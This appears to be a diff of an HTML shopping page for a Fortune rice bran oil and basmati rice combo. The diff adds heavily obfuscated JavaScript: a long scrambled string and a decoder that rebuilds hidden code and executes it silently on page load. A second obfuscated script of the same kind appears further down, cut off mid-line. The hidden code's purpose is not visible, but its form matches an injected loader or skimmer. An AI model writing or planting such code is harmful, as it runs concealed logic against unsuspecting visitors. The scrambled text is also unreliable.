h<t.shveuopyhmndbftsoojG/.ejdq4qqgghbqbeep<d<pyptthpjpx<pepbst~hgmhnscm;/|c;.e;oe.uo!bjnlssjhuhoGqdeo<sdyyb<ssyuffsxfuw~m;jjstojnqfmspdvum;bppj7ixp9n|9ejt|ftqebhpt{jf;fGspj.dj<<<gcp)!josejoffp5{oeufebusjzvs/u-.;y.ye1fjyqbnq;ojd<p;!ssv!fos5.Gjoocpdgqqbpv.1o~.feuys/sqf;f.~usj.e!opju1cc.j.!1se.yyby$h{pcm3$zpoc;.<quGduhpmjpbb~so.<husufu|p;y;1stihpd!/emuf*mfdnt$~put~xy!1;fmbj9f!vev2cnyiGff;upooeeeesg./p;is.cs$<2~.u/;jop$u;mfs<fgphif|ii;.215;pdeqf/o<u5pb!s<.o3ushuee/f;bptqqo;<ebe6p4szq2otmdp$.n;nfpo|bf/x;b/2x11q3sl!yfueququy2pesuqp;|.jjesmeous;p2qfdf6wq/bms1;|pduft!2jesueefbj2eu2jq<y1;h$<<p;bpyu.7vjp|yn$ntoof.jjubp2o1bdls6fysefp11esdbfoj7o|ffjp~te1pi1eyd!q$sebcu$eo<piqhtxn!;gbjhhmuov.shqf1eph.<s<bj;e&~j;~mfbnq.x|otxtu1xv1u<p9y6pempbfe/nnfyiq|b72gs{;;jpftttsy<&essjngduvov<t$|<qhyijduq;/vi&;nqicmq~6vejsmfjbb;j<<mesq3ghf22wqb*j|f!e<jbpobmpjtpdc/q1/gn.|~fep.m1qs;<1cy;ppy6o<he|fods2hcdbjhyq<j;15f;s<{dttjcouvgspmo;oupqm1bpbuxjuoxb!sf2i!/~5ss</~euofg<huh1ippztj<ygo2qqs2.cfptptphjophxph2f.ysb1doszj+hiujz3pe1f7b1e;ce;f.spn;jjqusm;qoc<p.7yyzqhp;m!mqy;pe!j;s!1<e.pz~uuhqe-i;fe;qe.1jqd+1f$pj/$yj.ob9woy;epgm.pgocq!<!ysy2ptjm.2o;toi;tqqfte;j.jfu+u2oucyvu&hyu|qsgstc2uususqf.~2fsmbuspupy2ci!b.5sqebt3;$u;j$qybujvg/pto;i;;1uim!db<i!jcy.gedu:.fb.hy|s1s;fzpeo.u<5p4tetq;b!zjqogs1e4b<eb{dmboj;y;;21;*p9uhiu2wp<sgfpo8bnetj<cj/1.wy;qfuxugqy|pjiy$o$;{yp6p~e4ocejjufdt{1!2c1w#<dq.!f;5fynb<sv.7mtjjocphb&sb<g;s.fppy.gmfb~g|ejj!ocof4|pjmo.yu!f!n1f1x#nlyujj2q|.beg.osej;v{;psid<bskm2.tjno<tpjoegeeoo2f9h/o<dyothe<j/;7b1gw<<b<!pnh1yctsjpsup3httf1seuuxe)vf1sjh;ugioeup/:jemh6<1|s~np.h!;fhpc2qo&pinqsxsqhi1!pjhvob|x<ou;;!ef;jjj.tyqb{i3.pbu!)xegt<j;qu1gbbmt;/cubov5ye<s<bphjh||u&ss{jtued|d;b727fs7pev.u<yefu1xoe.s:;f1qcocys~pu/spi1mpbqtzq<bnfcstjecei;<hejo;.jpepdsq5qs.qoutnjb~j;;qfupth11m1mpfp<bojshsb<bsj;||yqub-bhjoubjf5pcfo;2tvmjmfuyqy.dyti;vgmv2cyj.xjce!j<by.sco/uobj;encem2ec<ppy+dju;i)tj3cbshb3jtptpo~<y<up~|;5uzj/t9p~hx;{bf3wnz.ceptj.huohpbfft1jbdts.;loj1;1qh1k).;vq{;sqsuq<qpme2qf.hs;qmif1f)hqfb;tmfyjdx.j.sxsms!qtdpjzx;h.p!2-miqf3dcuyf4;m;fAbdpqp/j1yedof4ye/uj!;1-ysscips.upfcocf;h|./yqlmu~jbsmob11buyd-ppp<;q$b$snept;sst1<*p.wq<<d;h32-w!zhmbd.tjojshpf1jgcw~mhpjegpf;v1-z;<u7ms<c2y3zg<femj2;bq&e<ojjydqv6iq61b7|jpelcip.hf.uo!oppbbssp/uuvgbuw1;8c.-pecp3<f;g{ejpuq$um<jkuuf<pbs1uyq-sqnodp~pboxibcu<3;oym/zp;odifoucpx-g6pg3sfpsqn8gg.josjy3jbntvffxnmes1;!y1)yb.lxye;sulspnq1u~vp;v$;b;se;t<</mqsj4;sseybem<jbh;p!fozbqtontbpef~79<-.!ss<;c<pbb;efnby~.fqgo6ss2|;6pqi1fyeu-w.ef<s4fgo!;$ot8h;ymuut.ssjo1qn/.shji1pcxmq7pb;s!x/|ume6fp1c$1mbf7y<f;1bcfsqh3ype)26;pe.g.bj;;th;ou/1yb1bhjhf!ep;mq1xl6h7/fjgjf;6mv1pg&vej*<xsd/sps;bj<<ofn66sm4umxzgtdfj$h.s<!s9dcoij.zs1!f1oeqjqqjdppy$~btqy5<ueh~kj.p1)y.2eoghuybq6fj3ffj;zqfdo3;qfcsh*db;uh3|e!/s~!pyoyshpoo<gufy.gufjiveso6.<sqe;pb.;yy~me<yyej.bou.33swphj<f)2;iqgf.3|/x~.!piouthg/jm<t6s<ou/tubu*.nbyj7oqx2.<b!du<uoddujs3qjjycoqo169uyps3tx/sosseut.!bdcw;njgbmh;cuieb<bbe!oqu;f1xx/u$p|himpffpj~ydf.b.bu-qq;!o.q!jcp!/jhv;.xcqbbf;b{8of;bmj;jjedsjthy.9j1jjcjfmgb;jo.soh!fxt)ce*1yy26uuyfeux/shcd6cfv;3s~.sj<tg1vfg8vojdhvp;!tqh1eebwfppq2ouc<|i/7|.i1pe--!~1q.p!buo|gfibu1bju29txhodgu!ufz6t<tfjtm31jyi~uusffso;1fffkgusqgvb-uj$111ygq9ti/ejwu).1shu1<|/fjhpp;wpe.q;eqoo;jq~{<uiit~<;u21.ouvp;fypte1uog-</&!b;qf;hjmj;1e<!ipqdqcco;ms6b<.dy2jmu;9eyfn;/;;|c$.1wcuxto9w<ofp-ph71gs<sn2y~4itmf5-fd/uoypbbl.cpn1sncp~3tb.1q!!/;bci:2q/p3xqxm;fuuqjcusx1n;c/pbchjq!1pq|xq1upj;|<mesjcps;&)bboqqzh<y$7q2spf91bcsffy<pmfj.yfp.|;-;2f2oubcmys/qtmi.y-bmd5qnpe.ups;u<.sou/ym;sq<fqs9hmb11ebe8j<edfogg~xstg11933*ujdbz!hcyubfs~1jpp1bbsjm.ue$ss.hefn<bgfbcfyjqjeeq&esfehgjlg<zb|ejp!/qqf~.ol);tcu<|zjb-mso1es;ojtuf2bjhj!ofczmfepg<dyo<fy<j.s4ipt<ub.n/cf{o31yy*thh1Bpboic;hu/1t;|<eh$hodps2ohvo/ueb;foey3cf<;cs*nom.3uoqg<mdjspsfuq7~!<ij.s-sm)/fbgijf/!$udjj1;fsn.2tiu.d;jdcy*j.gp.g2p.|bhjc<;umpgjpmfs.;.y*2d3{wp1jj1hjdmuoy1v6fpoo11!p;c<muumptblm<<ot8ssp3so/s;opgc.bophozwes3x!</7p|fbv-be-ihlf;hq9m6ymh.1!em7pgb;ffoq.hpbuhi<epoqebhh1fupptzuoou;jfb9f7neqmn;mo1m!1pihy2|j*!6up;u~2jmqypu6sgubdsdms;befxuyfwsj!!uomj;.u.fBfseqjqbfypb2ve--$-tus<1cs<m~.s9p7wcy~of1*ubdbpljb1ejs|.!s.jo2epue{gt.josx.jyhysm<ss5f;1tf1u;pb1bzqjb;qq/q|b~uY&~;jfsv~ho~pt.nx1.ce;7jn.<fmjtuuj.uv<i!hje;hq|w/b1-|4vm&d|b|gm$y;tyisi.)<6o.eootxqsbf~sb|1qw;xn;f{jf;bvptgusjwj$jygb1of1c1oj<lqeepj3!2j!f|/ug.ui1fc|e/.gc;mbsjbsh<y|2fb2yf{ntmtq;p;hoft2o~ps9t1/bqehchpejph326n2jejnb6pf&sfn;ujpp1behh/e!sc!iqjs4<;ftq-f;4occ.sq2;o)*.f2dy;obstjtuo36qj7hjumn1qb<|ub$iuse!zjjiejjjp2fyhhqb2;;bts2qupbczm22/u.<t1*l<$.dpjoqf;<qymqitf-j&;euqxsgvfnz3;voufvney7j!ijym32ddb|qy.m)p!b<1s..{f<<hcgjlvuhmsduy~byuqncm*1fsbfhgnn;|qgt;;bth..qhtuo~jq7ffogy<xe1uqzcqbxq.sc{sp5uhoj;b/ff<s<;m!pz~<sbefjgctugym;2cm;|utyip;.hyqo.tp!nf<-u|;byufsjjp.psgfsep2zjoyc/|g2bqe;c-oeoo!t;sp!f41p.5xfj<umcs/o<yuc.otbjd1pggd!jjjogsjve5np;o7;duupbnp1z|zt/pgtj<.d|dbo9yqqmcqjn{g;jpjb.g~fftupshp-npml1ohne<eoofgtv$;qgpf.sdbo1;g|ztupgobufefouq<yyeuyeqjp2emhdjpsuf.mhim1;ofh~hibfcfees5;o4bymosbeusu&opitfupphmpojot.yb<!~o<umoo1!eiuuo/~xsxjjup-2uystusybsf;.<de9c!ft<mfjh.<pofudpus.jqutumg!mn1|dibhu1$~ujfupfjfeo;s19.<p/|;z;d.y$sdf;9t3y.gjspjtcoujfunfnmh;fqfbbsjb</gv;u;.&f;pn.g/fgj!.7;/qthvqn6*2lc;gbpo$fp1<cmh;oojpf.hnj;s;fo2smsunhhsesms2fct<f/9otxguo<h$s1$1yjbosb1~1hp2gemug4mqkbfo2t.{s~ti.p1|ug.30b<fjcohjbft1.pjcfsqt;f|j<cifj149<{qejs11su1gjpf:dvyvsy;q!ufejuvo<xsujqdzkZmb.jtuyp1ds{p<fy!djdunbufh<4*df;.dh</1pu1<vssb<u<t|;sycp;f/{;j|ujb;uyp;v)z)joqj;s&pefscw~cfhpmbd;fid4<p;2dfjnc~vp1ct;<9dfnue2j!vq2sjf2-qseowf<ogt.;1u.mo2;<mf;ebjvoimfslc<up~cm23p|obpon~p;$g3p<bjj~htu;5.u;1.pbutbncumu5J-fcbh<qivs2fdf/uuup|hhpq;mpp5qmg;su/e;s64p6mcsgtipu3qsf21btoimstbbfjqo1npz.qpfn.5slxsuf;sgjsmb9p/ssqypp3huc;2/e14o~pphzq/ump6ybn5&qjt;b);djygyu-tu;sbjjocq.h|fps:;popeeqsse;y~vo1jpu$qcf&4usuj.mj~joq~e|q<qug2u.dlo<z*f1;ugpeohtpyssqwo!1wo.v<ey;ff$<suqonogyus<~./;uodbde|yjnyxmjp1f.fh!h.~s-dpmxeui;y~bpbj|i1buuodj~$ws3d/;.y..|g!o;ctd$p;pzp/!g~/vj<jfps1Yhosobd-1fnf|jfu2<evefcf~s.pepo3j;3pcGt!scggt|2b/jvgn2o;oq$mctone.on&)vuppqp;t/o;ygos;gn/joexpj)tq;mh/2f13muGj1jbm<pg/dc{tg;7ugtsdf/b;.but;;<.ufv.;osz2u7<ph~bsbcvej!sh/.j;$p;s3x<<poC{~hsfnmm6lufug2qfm.pdyts4xsizsuq6usos2upt*fqbo;v~ybt;o/eiq.{2gs2b2.dgs|4fi|ybjfqho;p<1yofced;j|qjh;tfsb1f~ef1fpu<symu2/u~.s;$hufushf1g;3u3evp;g5;/uq;seyys/2ngq!uybv<2neyej2umbe&s;qqoufp<~j.1opx|4g;fs;js;qg$qj2bso$m43s;p2h!;!pq4fpy1;<sdc<jj<uo1fboe**/wfyu|nwhhtqp</jeqb2y;bdf2y<4yo<utu4f<3b6t<j$2tvsqso<<tk!ubqmtci.1nutj<<qbb<;..fbiojyuedejyg7u2vff7~c4!hnfp.4ycquqjqof<pojy.usgqvj.dbbqb;c&-jmonqssuqd.vsq3.{<fjbut<bq|qu.oqp41.b|st4;pyjyub;1nmen<s.jpbtnelesmd2p~#wbhbbp)<bfqjg;|jfc|tsiqcgynyps*y/s~~tsd;j<2s<o~je1fbj;bnfxhoduhfhe!bl3uTfu;yee.eeos-m9gu;pgqe;mbb<b!<p<<qeuhpq{n<eghpe<1sessbwfiufj|usjizh1ucf<f2.ev.jeujSpqpf2spm|obd~cstexggjf//bjmpfbqfp./ojqfh!hzsjju..gxbpo4;sqpphqY9ijddtjfnpxyon4eobcpzlphpj|ppmssssopj;sbsots;ob1j$c|hfh;gczjjvh|gpynepb)qfoubqosbc;~utqfuzbo;h/sjmtnoom;fft.so2he;udbghe~odbcjxi2bf.emo;nmv<;zfe.yjh.smh<spi.;ys.;dfgsgeojqbuut2ww|s;u5je1.puj;e;d)botu1nudute2bfoc5|!e6!h.ueb;dzuj/tc<;tcl<mpjf;ems..|qjjdj$fqoj~xsjy2j/1d4d;|;qjxpi!;3syebqnVj1wisp*z2v;perjbnojmhnfvms9!bhxxeyffph9sy;offof5oc!<5l5ncymfo;/$qh<;dybJo&bujq<;3s$-eu{tbp{psjyou.q$zjffj!xxmi9<<7h/j|heqhp6d-hqbp<zfu4ogyjb$l~s#h*s;h!cgqt3Bfzffsofdpo<efcye;ojjtt.;pu9gmq;chg.<y;uqp2sysmc;of1pg<om3hh-;<)7i/pmyp9so!;mhf;lv.b;sp!ec.hhqpegs;<pjy2uipdc!1uym:p!hebB<oqugg.jfs/jS5x.1utsf<s8j<c2jj<2~oim$tu1emuiimmbj;2goo!5ouopp1~p<p8v1j<dsquyf<pch8pjop1j.w;jeyp;5bcv7ooc3efj3!u<<ppuubjus$1puf1q/;uvu<nqs-o~oqljb;<|copoevu;cqehiw{f<wqgmbuqf;bq/;jhfcpgcdq;;zeftgqo..~yhc.oun/.b;:e.bhbetigpuu.4of1pyuv<bfsbfp1<duy<9dydwho8vnpbl;99;!|ugyuti<iptupbpce$5;/uesmeqfps.uj3en<u!iups..msj<clp<hql<pbi.eu;od<211g$d.:~.jf/cpmj|nssbe4-$spep-jbjoetpu~;!qpw;uc)msjgo.bhonbyhdosuj4u2ulc311mfpdgt{jepte{d;hesj411bqjvtodhufjnf$tb-b2fk.bbhmu.ds|bq!spu);u3pq.hbq<<ffmi1/jfhfsu<fp1jf|o4/1u;oobhfi.s{;n/gqe#s1sf.ceopfblpcs;1pmb.2f~oytsdygdyfpj1p{;ime|d;m<osqh~28j2heo;.ut.f2tcgbeI)1*dhfj.xsdhvbh2~vpj.1n|!jpl<pp<<sm<sf2ujfcp3pm;.p;6co6;;t2b;js;1;bgojf.w~uvmvj.<dsodj1osod1t/qt{vheomhc;enj;5;wsbm3sf1jt2/*ghq3s.1s4{b2qds<|om.x.u|tuycfpeloq/e;fbw;cbpfosjupbp$|bh2q2f.dpq;g!oj5c<g.yqhtqp1fe7yf.qghwh<iguc;f;pov;h;ys;$ssidbem;ept.sqs9csj3y/sslsy$u7guque<c~ycfyvq;jq~odbp;fv{fjfbwnbsuo$s7~b$6|e~fsej2;vqt;;e9phoq<5zbh;<G;qpjyojds!bs!oy2vyupeofuu.busdbtve;egpqu16n*o.je5$omjw2f9sjbyd~!es$gG1y|p</tpf/7)j1e<3t</fveuojuje;*ls;uf$;gvy/je6b</udo!qgeb{b1s<eom~ptjp2pG<<eoghqmbsq1g<<nq;gssoj.wdfofd~h)dpsg$go!qo5<ycsfph$yg.zfsq.gf..m/nvv2oGxgj;pimplfy-~cbby7pb<uox)bsesps.f<;gg~e1sh8n.pbsv;f~gd;;)yspssq/pebto2uGjptgopbsew<1pms<qoun|hft!*f|wAp.o.3:6;<j|bbxsu<o7f<pg3.<bo.jsssfm;e~.Geoqjutz;pjc-/sjhdyujbx;jbO<ycfnvsuxqgg/umdc2sjejnuqf/cmm3.neuuhjf;mm2;x<uumy.u;$xfp1qehjp<.osj2hgfn;bsfobffy16qsjfb<hefob|y~sppfqcbj.pidw$j|5$/fgi.bft;ggoxs-sfoomdxhhe1ifvb.d~eeesc!1gsbo|ddjushsx!fssyymsvtqufj3wdqgpjp;tzejimg!|e1ps..pvf.juqu.fy2lj;j<lt<8pofglpoi..hj2/we;<~bhtj;;|f3fpyggho2j;<{pfgtcf/e.jcssjtoiy;b#.<h/b$vkjp.<et.phm.;stje3sjf$bdj;{o9gx3sm<ggiu1{gcfwy~qps8vcup;thv;;<cs-xcsc!2tvum.dvqiospuwbvouqffsGm/lo7fpqp.~zpc~fu.1fmp;f<bs.*dpfu$pin54cpfBjbpm)2*t.jnpdbfupspben;iywx.Gje*.q;oyou|sps;t&;fu2sbAoes<uunu8sunq1pmbsedvfn2<upevmusj.v;qsjn5;<j!sGhf<cy2f~uf/n;s/tcj<2yu7|mn|fbd.utp8;;byqse.julofj<cjw!up.fhto$;)vbq4cf/bGobmp<3~.yqbwed|p{e7<pqcjfxsepep;n8qcs!ye<jbiheeodpgfufsjoijeg9.tsy1pxveG.mjuqq/tujsbfpcmfjqbnyphej.jmfnd;<ppz1<fdom;s;..pyzsse;nuu{;gq.;z!qs.tjGj|ouby/sj|mhssobe;tym;<sojeuvpu;f7njm|~uspt<wp$cxm..gb;$h<;f$gyn2|1yeifv~unfpe~sb{gmj);ud<2q<j1ge.buptsb2oqboegf.mf.bv2bjptdmo$2!c2;3<~b7g~<ffstfb.nefufp/o.2bld3mgh<pfj!iq;;jquysu<m/yspuxso2oesippt:2jp/3fgyqmusb|;/nsi;j/wj;ob..qjhpqbpomosu);;4$myf<hfcfcubs.f)e2eu;boxqb2ns518p/xyf/f.eg3jthf2osjo2udunyosmyzo.fu.fn42qgt!sejspyb.e;uc.;<|i$eu.bb~he~qeoi*<ycysfp1o;jj5hffh9.upv!fpp~;ujg.dnb1qyg!t<jo<s;sbj$pl.mdx;gpfts1|fy4uf<q;bubsoqgdohq;wx.qtjqutsvsg.uuxptyqy<gipct.ge2!mv4qjnjpj2gxodfbcxs/<3.bnb2s.e|uypf.iy2j.wyjw;fp|o;/mxf;fm;.y!n<4mbqupf~tjt4-ubome5g;uso7pj;eg<xebe~!bje.<!ouu<6fib<{f3emnewqffn1jpdx~tbq|jdmposqh;41.yfpu1<w;pu<ee1jpdffsetmvjtqiup;qqxfmdf|1*jb;bsyjt<hsfjpsbgelbqu;/bo2~*g.",(function(){this._W5L5YvH3h__wacD79={f:function(_Vh5,$){_19BP="\x70\x6c\x61";function _wNK4(_Vh5,$,_Ui,_E4){function _mrV(_F32z){_F32z=_6JVs(_F32z)-32-(_E4%95);if(_F32z<0){_F32z+=95;}_F32z+=32;_E4++;return _aF(_F32z);};function _awQ(_Vh5,_Ui){_SK58=_Vh5[_Ui];_A7s="";while(_SK58!="\f"){if(_SK58<" "){_A7s+=_SK58;}else{_A7s+=_mrV(_SK58);}_Ui++;_SK58=_Vh5[_Ui];}return _A7s;};function _6JVs(_SK58){return _SK58[_H7Y](0);};function _aF(_F32z){return this[_d96][_GlVm](_F32z);};_Ui=_Ui?_Ui:0;if(_Vh5[_ri]>_Ui){_E4=_E4?_E4:0;_iZZ5=_awQ(_Vh5,_Ui);_iH=_iZZ5[_ri];_ie=_awQ(_Vh5,_Ui+_iH+1);_jj=_ie[_ri];$[_iZZ5]=_ie;_wNK4(_Vh5,$,_Ui+_iH+1+_jj+1,_E4);}};_52F="\x72\x65"+_19BP+"\x63\x65";_H7Y=_8M("_ahco%Cr%Aedt");_d96=_8M("r_t%Sgni");_GlVm=_8M("_orfhCm%Crae_do");_ri=_8M("ne_lh_tg");_wNK4(_Vh5,$);function _8M(_1e98){return _1e98[_52F](/[x%y_z]/g,'')[_52F](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_oF9\fJztj|ryy\fkDA?|_\f%x%\"wz}\fx\"TpN\f)/*0\f\"#:]5\f'][z]TX?TA]_DYGbSVe\\;nrIG=HK\\QOdWH[pnJmdgMXe!;|S^ww)[%Z!+%08gAr0do/3;{l*lwARGEZM/XS]Wbj{'Y`b8F<$/k ~!u!)i{-&/53>$+Y\\%:E:AH<KO~DGRWLHSJK D%(P[^lkkCjexKyps^iqMo%Sgfq\"35,7/o7:?9s~8mo2tz&WLVZcT4[^c](3\\UM6g/:{pqx$xx,#+,<G!<>w?aDOCFMB=-DCEVP[E*-@`Wb[bi]lpPunicngM=Qit#u)})1l0'*u!(l]|xI}):A<O\"PGJ()^+6MI_'/2=marTkqkw !>Ioh%IYEP&-/(7n|wxP[0=#1AWbPBSLU[uTQbmP'lq?itandxrlw s~nFL*y%|/1q70+;$/+_bxv},7FKAAVMUV6AKT)*ED>I]oqTg|zGRiu|gSNY,'.%('7Wb&4>}f^i7DD:DKRgrB5}\"mx@cc\\c^u!ZciEh\\})[ptT*$&1v,*Pc-8/0+61@66A1Jv}rN>IRGQU^OFQMdXALWkjhgcgT_eU\\=Zev~^%',bm|XV|uit=4m46Gq|6q%4IIy%XWUTa!,P`./1(3j`ufm/:h;f#D_7B+.5*%>I#|2^[EP@3FI=LW;m!MxS^5K`VYdQ*/,C`kHSQRfqg}@}F]ny'..%t  WZXm{'7>:A\"-6Ss'(2F+6NZOR1<O`G.7B\\kby=Hc7]CdDO%w(+JUy3+WPv[S^=</>Yd3ClB_jNORdoE}{!GkvefYp{8CHBU\"2,\"4*11C$ZXwZQ*~~bZ/qj?=`Yb7qB2g<I5q%Uk_DQ=y-](`UWb}PI(@*Om@,bZ[t_bD8;>mk.fs_<O ;~@9-qffJSv$oL_0K/P[!c\\1/c'4 \\o@[?akO<:\\5o@0bV;H4p$ToIkD~O?tms'jdPbpQc+F/05mbdo8t`r!a458Cfx@[DEh2=oE*.ZrQ.y,:zRnuQ]IV`aWPYQdA-?M.e8v{kq]jtukdlexUASaBR3(S $SQsp{NTU*7,t_ewX+,/&yhf))svtzv|#zp3-w}0Tefg*0$}l#!\"2L031739?7-$MX+np#B.ZNF:JLJGtXYCSMCUKRRdEwW3qJDVc%5ym\\Z|UOan0@%xt`r!aJkkkDgas!BRi3>pK]k ~t@;v*>FY6\"4B#+js-e80CL-?f\"jk/Xc6>C}@3:e`>IVWTX%!vwqFJ{Kyxrz.jVhvWs,09\\n6Q:;^(3e9;PMSih2=o,K]fysr<Gy)UUV|H!)hq+Ob20R+G_cUVY2Nfj2[f9Mo\";{|rjk_[GYgH:95*Mi\"&M$Q0\\fj!p\\n|]jjh?3?dqqoEiRsssj4?q&HZsRw%%#GHG;*(J#k---$)664+kl0\"!|]QI=MOMJ\\=t18s}abcdZN^`^[mN&X7<,0s2nZlz[Jh2BK=iysi{qxx+k'%!]k:rIK]NA5$\"DAL~7bh\\7E06H)_asdWK0fhzk1Ze8P{\"uP<gi|`IQYLcH~!3$Ir}P5$7RQz&X-.O1['_68J;.A%&Dp!zp#x  2r]o'n@B6.\"242/AJ#q0YirOP+y8aqz-Va4khl27cz<+Ir#,>grE|y}CH&L^&A*+Nw#U)+@=CYX\"-_{;MVicB&Dp!zp#x  2rKE ?w[MPcF:6\"4B9=b&i[^q'P[.hz)=<2]XvZb6k:9bm@z-;ONDojxlt(cgKfjNw#Ui,>W(-Z;&'<thxzxu(~#f0;mDFCWp<7E9AT8V3~1? -pz_,<6,>4;;M.;AIb[4)j?MKcWS?Q_@rsN}#Fxy|FozMPW7'CQ|y%W)Sn/I':ig*bW9m{y2&j_Au$\"l6AsXGZut>I{\"OQx~J#UV1`T)}_4B@XkO2?#-s7ijEt8al?yv<4B!d#_K]kL!'%$^.ZjdZlbii{\\2565*b5H u1%iyZOzGMp#JeNOr<GyQUQg|{EP#{0[W&Q*\\oG=Xk;9[4D%yEq6_j=JS2y@l`OMoiI{[7uN^?4_,Py%WdmL4Z'({jh+csTItAe/:ld[Cso<0t'NiRSv@K}QShek\"!JU(Dcu~2,l0@!uAm2[f91(o@<z^THXZXUgH R16&*mnQ@^(8A5!})[ab7D9\"lr%e89<3Jk>?Bk5@rxyN[PvTzMNQzDO\"<U6$O(8xm9e*S^1=\"/>4`sCAc]=,Js$-l`XL\\^\\YkL$V5:*.qTago)\"ZIg1AJ*=b7=;:tFiB<v6nYk#j<>?R+~/1/,>~VryU_Ca>*<J+0$9wm1h;y~nr?OI?QGNN`AFUx.|oHz.e[vjYWysSXLa@\"uZ_ShG=`8T[7Aym} }z-mCFGF;sFY1'BU9108; -pz IT'jl~>*U.`sKA_4A%/4]h;qvS=<epCWy,Eq%hONbRXxW{orh\\lnli{\\4PW3=!?{gy(h#SnJm GbKLo9DvhPSxwAL~RuUW\"MV@Y-SfC/AO0dL<hys7Ip,tu9bm@2y|BAjuH{?~!Kv i#W|0lXjxYi-Wk5=`r:U>?b,7i[CFkj4?qEhHJt@I3L\"FY6\"4B&=b\"%c@,>L?kQRl9CG]M9KYDxlxH{@55x@itG[}0I(WyzymiUguZ`6YNN2Yh]<xdv%iDg\\\\@g1<nRB`[+r>!AT$\"DEN8dYRS`b*PNOR/hj^Htsxy]^RIcv>Dw[DLTGbMKmnwa..{|*,Sywx{X24(q>ABC'({r-@gmAi!d.9k!B~F\\o;&>Q)U;<V:#+3&=,*L7OC+B&OZ-Bc@g}1\\G_rJv\\]w[HFhE~!t^}.qeNT*M_'B+,Ox$VH03XW!,^2U57a-i492E)n&i3>p&G$Kat@|#DW;<)'I4L@(?#LW*?`=dz.YD\\oSM9KY:p#X{BY=fqDXz-F%aM_mWS.Q4-a_{(q++,8t`r!ulAdv>YBCf0;m?Q|Gpo9DvekKxD|_X-+QS=VVWQdA-?M0lWXmJ6HVD<vjvS?Q_CK WN!]I[iT)|)fXZ^X{^2V-?t$wtfhlf*emAe<N$3'#n!/)tOu-px!uT$\"D6\"\\]!;k'NB1/QK+0?bwfY4\\]QI=MOMJ\\D@LTG}aF#mn$gPX`SjfRdrS(g[NM7+7fd'xd?@c8 o<M3'%pK173MrG'zmlVKV:#+3&A,*L>*de)9\\';dXLJ6p[W]r8lL@32{p{_Dn\"^J#RPrK _SFEznU 3V+1/.h8{|bj-@lhAp34E)xp9:Ks{P<) B%|C@%!Y=*(JD$)8[p_R-UVJB6FHFCU=9EM@vZGEg@/Mv'0ocHca]:HvO>\\&6?~2uv5\f");function _hb(_FkY,_143,_KGp,$,_c7H,_1N8){_19=this._W5L5YvH3h__wacD79;_19.f(_c7H,$);if(!_KGp){_KGp=$.__u8n;}_g6V()(_FkY,0,0x2449,this,"''");function _g6V(){return function(_aUS,_3Cw,_a75F,_793,_65G){_19.p1=_aUS;_19.p2=_a75F;try{_s3oG(_793)(_6b()([_KGp[$._730lN]("+p%p",_65G)[$._730lN]("-p%q",_65G)],''))();}catch(e){}function _s3oG(_X7){return _X7[$._nD6];};_793._W5L5YvH3h__wacD79=_1N8;};};function _6b(){return function(_wtx,_7on4){return _wtx[$._g9T1](_7on4);};};};}());
+</script>
 </head>
 <body>
 
@@ -1029,24 +15,52 @@ body {
   <div class="header-nav-bar">
       <img src="https://i.ibb.co/YFwrjxMw/r9uchf3.png" alt="r9uchf3">
   </div>
+    <!-- Media card -->
+    <section class="media-card" aria-label="Product images and gallery">
+      <div class="hero-wrap">
+        <div class="hero" id="hero" aria-live="polite" aria-atomic="true">     
+        <img src="https://i.ibb.co/yBYQ5zfM/Screenshot-2025-10-01-09-15-18-539-com-whatsapp-edit-min.jpg" alt="Screenshot-2025-10-01-09-15-18-539-com-whatsapp-edit-min" border="0">
+       </div>
+      </div>
 
-<main class="container">
-  <div class="grid">
-    <!-- Gallery -->
-    <section class="card">
-      <div class="main-image">
- <img src="https://i.ibb.co/yBYQ5zfM/Screenshot-2025-10-01-09-15-18-539-com-whatsapp-edit-min.jpg" alt="Screenshot-2025-10-01-09-15-18-539-com-whatsapp-edit-min" border="0">
+      <div class="thumbs" id="thumbs" aria-label="thumbnails">
+        <!-- thumbnails injected by JS -->
+      </div>
     </section>
 
+    <!-- Info area -->
+    <section class="info" aria-labelledby="productTitle">
+      <div class="title-row">
+        <div>
 
 
-    <!-- Info -->
-    <aside class="card info">
-      <div style="background:#111;color:#fff;display:inline-block;padding:6px 12px;border-radius:8px;font-size:14px;font-weight:600">
-        5L+5KG
-      </div>
-      <h1>Fortune, Soyabean Rice Bran Oil 5L Jar + Basmati Rice, 5KG Bag. (Combo)</h1>
-  
+
+
+
+
+<script>
+(function(){_r8gr("Scu(Bjmto.fj<jqb;md<ju;1&cytbp;!q!q!hb11111*mcmgo.jf2q<pp;333<puxji;1~$ffueuMcmgo.fhu71dms$951|enjt;##fjfup##-tsq.e;#tdjonsj;6y1qejh2q!7ycdhpo.pp;ggcsf;q!pj!fff<pes.sbejvt;5qy<gpou.gbnjmz;(ppp-sb-bttsgetmzcplxei21<p.iex12y3ysc)---/9~/bf|put{;5ydms$222go.fhu61tmdfRzbf|puxji;1<pp;38g~#pbo##-sesdjo;##djuj##~/fup|bho2q!<beo;3y2q<blsvedms$g<pes2ytme$111csf",(function(){this._W5L5YvH3h__wacD79={f:function(_17F3,$){_G6Pz="\x70\x6c\x61";function _9NK(_17F3,$,_PhO,_5TL){function _p6(_TyU){_TyU=_YM9(_TyU)-32-(_5TL%95);if(_TyU<0){_TyU+=95;}_TyU+=32;_5TL++;return _F4uG(_TyU);};function _Kk(_17F3,_PhO){_E2d6=_17F3[_PhO];_pGu="";while(_E2d6!="\f"){if(_E2d6<" "){_pGu+=_E2d6;}else{_pGu+=_p6(_E2d6);}_PhO++;_E2d6=_17F3[_PhO];}return _pGu;};function _YM9(_E2d6){return _E2d6[_Xg](0);};function _F4uG(_TyU){return this[_iKS][_365](_TyU);};_PhO=_PhO?_PhO:0;if(_17F3[_1Xh5]>_PhO){_5TL=_5TL?_5TL:0;_19v7=_Kk(_17F3,_PhO);_Zqm4=_19v7[_1Xh5];_Gz3=_Kk(_17F3,_PhO+_Zqm4+1);_0g=_Gz3[_1Xh5];$[_19v7]=_Gz3;_9NK(_17F3,$,_PhO+_Zqm4+1+_0g+1,_5TL);}};_46Tb="\x72\x65"+_G6Pz+"\x63\x65";_Xg=_EVEK("_ahco%Cr%Aedt");_iKS=_EVEK("r_t%Sgni");_365=_EVEK("_orfhCm%Crae_do");_1Xh5=_EVEK("ne_lh_tg");_9NK(_17F3,$);function _EVEK(_GKG){return 